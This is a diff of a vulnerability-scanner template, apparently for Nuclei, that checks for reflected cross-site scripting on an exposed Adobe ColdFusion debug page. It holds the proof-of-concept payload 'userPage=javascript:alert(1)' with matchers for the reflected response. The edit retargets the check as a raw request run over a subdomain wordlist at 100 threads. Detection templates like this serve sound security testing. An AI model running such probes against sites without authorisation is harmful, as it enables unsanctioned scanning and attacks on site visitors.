@@ -1,31 +1,40 @@
-id: coldfusion-debug-xss
-
+id: coldfusion-debug-xss 1
 info:
-  name: Adobe ColdFusion Debug Page XSS
   author: dhiyaneshDK
-  severity: medium
-  description: The remote Adobe ColdFusion debug page has been left open to unauthenticated users, this could allow remote attackers to trigger a reflected cross site scripting against the visitors of the site.
+  description: The remote Adobe ColdFusion debug page has been left open to unauthenticated
+    users, this could allow remote attackers to trigger a reflected cross site scripting
+    against the visitors of the site.
+  name: Adobe ColdFusion Debug Page XSS
   reference: https://github.com/jaeles-project/jaeles-signatures/blob/master/common/coldfusion-debug-xss.yaml
+  severity: medium
   tags: adobe,coldfusion,xss
+requests:
+- attack: sniper
+  matchers:
+  - part: body
+    type: word
+    words:
+    - '"cf_main_cf" src="javascript:alert(1)"'
+  - part: header
+    type: word
+    words:
+    - text/html
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'GET /CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1) HTTP/1.1
 
-http:
-  - method: GET
-    path:
-      - '{{BaseURL}}/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1)'
-      - '{{BaseURL}}/cfusion/debug/cf_debugFr.cfm?userPage=javascript:alert(1)'
+    Host: {{Subdomains}}
 
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - '"cf_main_cf" src="javascript:alert(1)"'
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
 
-      - type: word
-        part: header
-        words:
-          - "text/html"
+    Accept-Encoding: gzip, deflate
 
-      - type: status
-        status:
-          - 200
+    Accept: */*
+
+    '
+  threads: 100
